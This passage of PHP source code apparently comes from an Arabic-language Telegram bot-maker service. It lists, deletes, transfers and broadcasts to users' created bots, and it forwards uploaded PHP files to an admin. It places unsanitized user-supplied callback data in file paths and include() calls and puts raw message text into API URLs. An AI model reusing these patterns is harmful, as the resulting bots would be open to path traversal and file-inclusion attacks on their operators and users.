$keyboard["inline_keyboard"][] = [['text'=>" إذاعة لكل البوتات ",'callback_data'=>"sendpostbotsall"]];
$keyboard["inline_keyboard"][] = [['text'=>"• رجوع • ",'callback_data'=>"freebot"]];	$reply_markup=json_encode($keyboard);
unlink("from_id/$from_id/yes.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>" هذه هي قائمة بوتاتك المصنوعة 

",
"message_id"=>$message_id,
'reply_markup'=>$reply_markup
]);
}else{
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>"• لايوجد لديك اي بوت حاليا ❌",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• رجوع •' ,'callback_data'=>"freebot"]],
]])]);}}
if(preg_match('/^(infobot) (.*)/s', $data)){
$userbot = str_replace('infobot ',"",$data);
$userbot = str_replace(' ',"",$userbot);
$idbots=file_get_contents("user/$userbot.txt");
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$userbot=$infobot['1'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
include("NAMERO/$idbots.php");
$tokenboot="$tokenbot";
$mm=explode("\n",file_get_contents("botmak/$idbots/NaMero/member.txt"));
$co=count($mm)-1;
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>" معلومات البوت المصنوع 📝: 
----------------------------
- الاسم: `$use`
• النوع : $s_p_p1
• الايدي : `$idbots`
• الاسم : `$namebot`
- التوكن : 6704860429:dsvbb********gxgx
 
• عدد الاعضاء المشتركين في البوت : $co
",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>' حذف البوت' ,'callback_data'=>"deletebot ".$userbot],['text'=>'نقل الملكية' ,'callback_data'=>"naglbotmember ".$userbot]],
[['text'=>'• رجوع •' ,'callback_data'=>"botsmember"]],
]])]);}
if(preg_match('/^(deletebot) (.*)/s', $data)){
$userbot = str_replace('deletebot ',"",$data);
$userbot = str_replace(' ',"",$userbot);
$idbots=file_get_contents("user/$userbot.txt");
$botfrom=explode("\n",file_get_contents("from_id/$from_id/countbot.txt"));
if(in_array($userbot,$botfrom ) and $idbots!=null){
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$tokenbot=$infobot['0'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
$us=file_get_contents("from_id/$from_id/countbot.txt");
$us=str_replace("$userbot\n","",$us);
file_put_contents("from_id/$from_id/countbot.txt",$us);
$ussss="$userbot==code#$userbot#$idbots";
$uss=file_get_contents("from_id/$from_id/idbot.txt");
$uss=str_replace("$ussss\n","",$uss);
file_put_contents("from_id/$from_id/idbot.txt",$uss);
unlink("botmak/user/$userbot.txt");
unlink("botmak/$idbots/$userbot.php");
$us2="@$userbot";
$us1=file_get_contents("from_id/$from_id/countuserbot.txt");
$us1=str_replace("$us2\n","",$us1);
file_put_contents("from_id/$from_id/countuserbot.txt",$us1);
$us11=file_get_contents("infoidbots.txt");
$us11=str_replace("$idbots\n","",$us11);
file_put_contents("infoidbots.txt",$us11);
if(is_dir("botmak/$idbots")){
remove_dir("botmak/$idbots");
}
///by @NameroBots
//by @S_P_P1
/// Programmer Namero (Rights are not allowed to change ⚡) 

include("NAMERO/$idbots.php");
$tokenboot="$tokenbot";
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*• تم حذف البوت بنجاح*
• معرف البوت : @$userbot

- إذا كان ذلك عن طريق الخطأ يمكنك أعاده صنع بوتك وستتمكن من استعاده جميع بيانات البوت .
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'• رجوع • ' ,'callback_data'=>"botsmember"]],
]])]);
}}

$codejson = json_decode(file_get_contents("code.json"),true);
if (!file_exists("code.json")) {
	$put = [];
file_put_contents("code.json", json_encode($put));
}
if(preg_match('/^(naglbotmember) (.*)/s', $data)){
$userbotfree = str_replace('naglbotmember ',"",$data);
$code = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), -35);
$idbots=file_get_contents("user/$userbotfree.txt");
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$userbot=$infobot['1'];
$id=$infobot['3'];
$s_p_p1=$infobot['6'];
$codejson["info"][$code]["st"]="yes";
$codejson["info"][$code]["idbot"]="$idbots";
$codejson["info"][$code]["userbot"]="$userbot";
$codejson["info"][$code]["admin"]="$id";
file_put_contents("code.json", json_encode($codejson));
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"
• رابط النقل : https://t.me/$user_bot_NaMero?start=$code
• أرسله إلى الشخص المراد نقل البوت إليه .
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>' • رجوع •' ,'callback_data'=>"botsmember"]],
]])]);}
if(preg_match('/^\/([Ss]tart) (.*)/',$text)){
preg_match('/^\/([Ss]tart) (.*)/',$text,$match);
$code=$match[2];
$codejson = json_decode(file_get_contents("code.json"),true);
$st=$codejson["info"][$code]["st"];
$idbots=$codejson["info"][$code]["idbot"];
$userbots=$codejson["info"][$code]["userbot"];
$admin=$codejson["info"][$code]["admin"];
$idbots=file_get_contents("user/$userbots.txt");
	$botfrom=explode("\n",file_get_contents("from_id/$admin/countbot.txt"));
	if($admin!=$from_id){
if($st=="yes" and $admin!=null){	
if(in_array($userbots,$botfrom ) and $idbots!=null){
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$tokenboot=$infobot['0'];
$userbot=$infobot['1'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
#حذف البوت 
$us=file_get_contents("from_id/$admin/countbot.txt");
$us=str_replace("$userbot\n","",$us);
file_put_contents("from_id/$admin/countbot.txt",$us);
#حذف ازرار
$ussss="$userbot==code#$userbot#$idbots";
$uss=file_get_contents("from_id/$admin/idbot.txt");
$uss=str_replace("$ussss\n","",$uss);
file_put_contents("from_id/$admin/idbot.txt",$uss);
$us2="》- @$userbot";
$us1=file_get_contents("from_id/$admin/countuserbot.txt");
$us1=str_replace("$us2\n","",$us1);
file_put_contents("from_id/$admin/countuserbot.txt",$us1);
$us5=file_get_contents("botmak/$idbots/info.txt");
$us5=str_replace("$admin","$from_id",$us5);
file_put_contents("botmak/$idbots/info.txt",$us5);
# تخزين البوتات للعضو
file_put_contents("from_id/$from_id/countuserbot.txt","》- @$userbot\n",FILE_APPEND);
file_put_contents("from_id/$from_id/countbot.txt",$userbot."\n",FILE_APPEND);
#bots
$idbotfrom=explode("\n",file_get_contents("from_id/$from_id/idbot.txt"));
if(!in_array($ussss,$idbotfrom )){
file_put_contents("from_id/$from_id/idbot.txt","$ussss\n",FILE_APPEND);
}
$botfree=explode("\n",file_get_contents("botfreeid.txt"));
if(!in_array($from_id,$botfree )){
file_put_contents("botfreeid.txt",$from_id."\n",FILE_APPEND);
}
file_put_contents("botmak/$idbots/admin.txt","$from_id");
$us6=file_get_contents("botmak/$idbots/NaMero.json");
$us6=str_replace("$admin","$from_id",$us6);
file_put_contents("botmak/$idbots/NaMero.json",$us6);
#unlink("botmak/$idbots/NaMero.json");
$mm=explode("\n",file_get_contents("botmak/$idbots/NaMero/member.txt"));
$co=count($mm)-1;
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"
• تم تحويل البوت إليك 
• معلومات البوت :

- اسم البوت : $namebot
- معرف البوت : $userbots
- أيدي البوت : $idbot
- توكن البوت : محمي

• عدد مستخدمين البوت : $co
• نوع البوت المصنوع : $s_p_p1
",
]);
bot('sendmessage',[
'chat_id'=>$admin,
"text"=>"
تم نقل [بوت](t.me/$userbot) الى [$from_id](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
]);
unset($codejson["info"][$code]);
file_put_contents("code.json", json_encode($codejson));
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"ارسال /start .!
",
'reply_to_message_id'=>$message_id,
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"
• لا يمكنك نقل البوت إلى نفسك !
",
'reply_to_message_id'=>$message_id,
]);}}
$datatime = json_decode(file_get_contents("datatime.json"),true);
$datatimesend = $datatime["info"][$from_id]["date"];
if($data=="sendpostbotsall"){
$timeuoto=time()+(3600 * 1);
$day = date('Y-m-d',$timeuoto);
if($day!=$datatimesend){
$datatime["info"][$from_id]["date"]="$day";
file_put_contents("datatime.json", json_encode($datatime));
file_put_contents("from_id/$from_id/amr.txt","sendpostbotsall");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>" 
• أرسل النص الآن الرسالة إلى جميع مشتركين بوتاتك المصنوعة .
$infobotsmember
",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• رجوع • ' ,'callback_data'=>"botsmember"]],
]])]);
}else{
bot('answercallbackquery',[
'callback_query_id'=>$up->id,
"text"=>"
• معذرة لاتستطيع عمل الاذاعة لكل بوتاتك المصنوعة اكثر من مرة واحدة،
-فقط في اليوم $day 
- ستتمكن من نشر الاذاعة غداً
 ",
'show_alert'=>true,
]);}}
if($text and $amrmem =="sendpostbotsall"){
file_put_contents("from_id/$from_id/amr.txt","");
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"جاري عمل الاذاعة ",
'reply_to_message_id'=>$message_id,
]);
$bots=explode("\n",file_get_contents("from_id/$from_id/countbot.txt"));
$coo=count($bots)-1;
for ($i=0; $i < count($bots); $i++) { 
$userbots=$bots[$i];
$idbots=file_get_contents("user/$userbots.txt");
include("NAMERO/$idbots.php");
$tokenboot="$tokenbot";
$mm=explode("\n",file_get_contents("botmak/$idbots/NaMero/member.txt"));
for ($l=0; $l < count($mm); $l++) {
$id=$mm[$l];
file_get_contents("https://api.telegram.org/bot".$tokenboot."/sendmessage?chat_id=".$id."&text=$text");
}
$co=$co+$l-1;
}
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"- تمت الاذاعة في جميع البوتات المصنوعة 
- تم الارسال الى $co مستخدم.
- عدد البوتات : $coo
",
'reply_to_message_id'=>$message_id,
]);}

$text_wellcome ="ارسل الملف مره اخري"; 
if($data=="uplode"){
file_put_contents("from_id/$from_id/amr.txt","uplode");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>" *أرسل ملف php الآن !*

بشروط :

1. لا يحتوي الملف على أي أخطاء برمجيه

2. يجب أن يكون عمله دون الحاجة إلى اتصال بخدمات خارجية (api)

3. لا يحتوي على معرف لقناة أو مطور ( يتم وضع معرف المطور عند صنع البوت من قبل المستخدم )
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• رجوع • ' ,'callback_data'=>"freebot"]],
]])]);}
$tw_NaMero=$infoNaMero["info"]["NaMero"];
if($message and $amrmem =="uplode" and !$data){
if( $update->message->document ){
file_put_contents("from_id/$from_id/amr.txt","");
$file_id = $update->message->document->file_id;
bot('senddocument',[
"chat_id"=>$SALEH,
"document"=>$file_id,
]);
bot('sendmessage',[
"chat_id"=>$SALEH,
'message_id'=>$message_id,
"text"=>"*👾 طلب ارسال ملف جديد*
معلومات المرسل 🌐 
الاسم : *$name*
الايدي : $from_id
المعرف : $user
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
bot('sendmessage',[
"chat_id"=>"$chat_id",
'message_id'=>$message_id,
"text"=>"*• تم إرسال الملف إلى المشرفين سيتم فحصهة وسيتم وضع اسمك في البوتات 🔰*
",
'parse_mode'=>"MarkDown",
]);
}else{
bot('sendmessage',[
"chat_id"=>"$chat_id",
'message_id'=>$message_id,
"text"=>" قم بإرسال الملفات فقط ",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text" => $text_wellcome, "callback_data" => "editBots"]], 
[['text'=>'• رجوع • ' ,'callback_data'=>"freebot"]],
]])]);}}

if($text =="/id"){
bot('sendMessage',[
'chat_id'=> $chat_id, 
"text" => $chat_id, 
]); 
}

if($text =="/name"){
bot('sendMessage',[
'chat_id'=> $chat_id, 
"text" => $name, 
]); 
} 

if($text =="/user"){
bot('sendMessage',[
'chat_id'=> $chat_id, 
"text" =>"[@$user]", 
]); 
} 
if($text =="/name"){
bot('sendMessage',[
'chat_id'=> $chat_id, 
"text" => $message_id, 
]); 
} 
///by @NameroBots
//by @S_P_P1
/// Programmer Namero (Rights are not allowed to change ⚡) 
